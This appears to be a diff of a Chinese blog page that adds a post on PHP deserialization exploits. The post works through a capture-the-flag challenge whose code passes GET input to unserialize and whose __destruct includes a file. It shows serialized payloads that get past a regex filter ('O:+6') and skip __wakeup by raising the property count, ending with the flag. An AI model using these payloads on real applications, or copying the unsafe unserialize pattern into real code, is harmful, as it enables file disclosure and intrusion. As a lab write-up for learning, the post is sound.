@@ -10,7 +10,16 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
     <meta name="keywords" content="二月,"> 
-    <meta name="description" content="所感所想，所言所行，我将以文字记录我自己。,"> 
+    <meta name="description" content="所感所想，所言所行，我将以文字记录我自己。,反序列化漏洞利用主要函数
+
+serialize 序列化函数
+unserialize 反序列化
+
+原理：
+1.用户输入可以传入到unserialize
+2.存在可利用的函数
+3.有危险的魔术方法
+4.,"> 
     <meta name="author" content="Allureluoli"> 
     <link rel="alternative" href="atom.xml" title="二月の档案室" type="application/atom+xml"> 
     <link rel="icon" href="/img/favicon.png"> 
@@ -21,7 +30,16 @@
     
     <meta name="twitter:card" content="summary"/>
     <meta name="twitter:title" content="2026-3-15-反序列化漏洞利用 - 二月の档案室"/>
-    <meta name="twitter:description" content="所感所想，所言所行，我将以文字记录我自己。,"/>
+    <meta name="twitter:description" content="所感所想，所言所行，我将以文字记录我自己。,反序列化漏洞利用主要函数
+
+serialize 序列化函数
+unserialize 反序列化
+
+原理：
+1.用户输入可以传入到unserialize
+2.存在可利用的函数
+3.有危险的魔术方法
+4.,"/>
     
     
     
@@ -29,7 +47,16 @@
     <meta property="og:site_name" content="二月の档案室"/>
     <meta property="og:type" content="object"/>
     <meta property="og:title" content="2026-3-15-反序列化漏洞利用 - 二月の档案室"/>
-    <meta property="og:description" content="所感所想，所言所行，我将以文字记录我自己。,"/>
+    <meta property="og:description" content="所感所想，所言所行，我将以文字记录我自己。,反序列化漏洞利用主要函数
+
+serialize 序列化函数
+unserialize 反序列化
+
+原理：
+1.用户输入可以传入到unserialize
+2.存在可利用的函数
+3.有危险的魔术方法
+4.,"/>
     
 <link rel="stylesheet" href="/css/diaspora.css">
 
@@ -66,10 +93,48 @@
         <div class="stuff">
             <span>三月 15, 2026</span>
             
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li></ul>
+
 
         </div>
         <div class="content markdown">
-            
+            <h3 id="反序列化漏洞利用"><a href="#反序列化漏洞利用" class="headerlink" title="反序列化漏洞利用"></a>反序列化漏洞利用</h3><p>主要函数</p>
+<ul>
+<li>serialize 序列化函数</li>
+<li>unserialize 反序列化</li>
+</ul>
+<p>原理：</p>
+<p>1.用户输入可以传入到unserialize</p>
+<p>2.存在可利用的函数</p>
+<p>3.有危险的魔术方法</p>
+<p>4.构造POP链达到漏洞利用</p>
+<p>例：</p>
+<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$flag</span> != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;flag: &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;sorry, flag not found&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file=<span class="string">&#x27;fakeflag.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$cmd</span>)) <span class="keyword">echo</span> <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Are you daydreaming?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">unserialize</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//secret in flag.php</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">secret</span>();</span><br><span class="line">	<span class="variable">$a</span> -&gt;<span class="title function_ invoke__">__destruct</span>();</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>1.先过正则</p>
+<p>2.跳过__walkeup</p>
+<p>3.执行__destruct()</p>
+<ul>
+<li><p>O%3A6%3A”secret”%3A1%3A{s%3A4%3A”file”%3Bs%3A8%3A”flag.php”%3B} </p>
+</li>
+<li><p>O:6:”secret”:1:{s:4:”file”;s:8:”flag.php”;}</p>
+</li>
+</ul>
+<p>被正则过滤Are you daydreaming?</p>
+<ul>
+<li><p>O:+6:”secret”:1:{s:4:”file”;s:8:”flag.php”;}</p>
+</li>
+<li><p>O%3A%2B6%3A”secret”%3A1%3A{s%3A4%3A”file”%3Bs%3A8%3A”flag.php”%3B}</p>
+</li>
+</ul>
+<p>flag: fakeflag!</p>
+<p>没有绕过</p>
+<p>__wakeup()</p>
+<ul>
+<li>O:+6:”secret”:2:{s:4:”file”;s:8:”flag.php”;}</li>
+</ul>
+<p>URL编码后成功拿到flag</p>
+
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
                 <source type="audio/mpeg" src="">
@@ -101,7 +166,7 @@
     </div>
     
         <div class="side">
-            
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">反序列化漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">2.</span> <span class="toc-text">题目</span></a></li></ol>
         </div>
     
 </div>
